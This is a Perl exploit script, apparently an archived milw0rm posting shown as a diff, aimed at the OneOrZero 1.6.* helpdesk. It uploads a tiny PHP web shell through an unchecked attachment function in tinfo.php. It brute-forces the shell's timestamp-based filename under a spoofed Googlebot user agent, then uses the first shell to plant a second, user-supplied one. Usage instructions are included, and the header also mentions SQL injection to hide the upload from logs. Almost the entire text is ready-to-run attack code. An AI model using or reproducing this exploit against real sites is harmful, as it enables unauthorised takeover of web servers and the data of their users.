@@ -1,0 +1,153 @@
+#!/usr/bin/perl
+=about
+
+ OneOrZero 1.6.* Perl exploit
+
+ AUTHOR 
+	discovered & written by Ams
+	ax330d [doggy] gmail [dot] com
+
+ VULN. DESCRIPTION:
+	In 'tinfo.php' script there are function
+	named uploadAttachment() through which
+	we are able to upload files.
+	It does not checks what the file
+	is uploaded.
+
+ EXPLOIT WORK:
+	First of all it uploads small shell,
+	then, due to unknown shell name,
+	it bruteforces it.
+	(Uploaded shell name is concatenation 
+	of original filename, 
+	unix timestamp and substracted
+	microseconds from time.)
+	Then it uploads new shell through 
+	small shell.
+	(Script saves to DB what has been uploaded,
+	but if magic_quotes_gpc=off exploit
+	will disable this logging via SQl-inj.)
+
+ REQUIREMENTS:
+	Upload must be allowed.
+ 
+ PS:
+	With register_globals=on there are even more
+	vulnerabilities, starting from LFI till 
+	remote code execution.
+
+=cut
+
+use strict;
+use warnings;
+
+use LWP::UserAgent;
+use HTTP::Request::Common;
+
+$| = 1;
+&banner;
+
+my $expl_url = shift or &usage;
+my $tshell2  = shift;
+&usage unless -f $tshell2;
+
+my $tshell = q(<?php move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name'])?print('ok1'):0;?>);
+my $spider = LWP::UserAgent->new;
+
+$spider->timeout(9);
+$spider->max_redirect(0);
+$spider->agent('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
+
+exploit($expl_url);
+
+sub exploit {
+    
+    $_ = shift;
+    
+	my($prot, $host, $path, ) = m{(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?};
+    print "\n\tExploiting: $prot://$host$path\n";
+	
+    my $req
+        = POST "$prot://$host$path/tinfo.php?id=999999",
+        Content_Type => 'form-data',
+        Content      => [send_mail    => 1,
+						 SelectedFile => [ undef, 'by441e.php', 'Content_Type' => '\' text', 'Content' => $tshell ]
+						];
+	
+	my $start_time = time();
+	
+    my $res = $spider->request($req);
+    if (!$res->is_success) {
+        print "\tFailure...\n" . $res->status_line . "\n";
+        return 0;
+    }
+    
+	if ($res->content !~ /by441e\.php/) {
+		print "\tFailure...\n";
+		return 0;
+	} else {
+		print "\n\tTest shell uploaded";
+	}
+
+    my $finish_time = time();
+    
+    print "\n\tStarting bruteforce (start:${start_time}000 finish:${start_time}999)\n";
+    
+    for my $sec ($start_time .. $finish_time) {
+        for my $micro ('000' .. '999') {
+			
+            print "\t$prot://$host$path/attachments/$sec${micro}_by441e.php\r";
+            $res = $spider->request(HEAD "$prot://$host$path/attachments/$sec${micro}_by441e.php");
+			
+            if ($res->status_line =~ /200/) {
+                print "\n\tFound one of shells...";
+				if (reload("$prot://$host$path/attachments/$sec${micro}_by441e.php")) {
+					print "\tShell: $prot://$host$path/attachments/sha.php\n";
+				}
+                return;
+            }
+        }
+    }
+	
+    print "\n\tCould not find shell...\n";
+}
+
+sub reload {
+	
+	my $addr = shift;
+    my $req
+        = POST $addr,
+        Content_Type => 'form-data',
+        Content      => [ f => [ $tshell2, 'sha.php']];
+	my $res = $spider->request($req);
+	
+	if ($res->content =~ /ok1/) {
+		print "new shell uploaded!\n";
+		return 1;
+	} else {
+		print "could not upload new shell.\n";
+		return 0;
+	}
+}
+
+sub usage {
+    
+	print "
+	Provide url and shell what to upload.
+	Usage:
+		perl $0 http://example.com localshell.php
+
+";
+	exit;
+}
+
+sub banner {
+    
+    print "
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	  OneOrZero 1.6.* exploit
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	";
+}
+
+# milw0rm.com [2008-12-19]
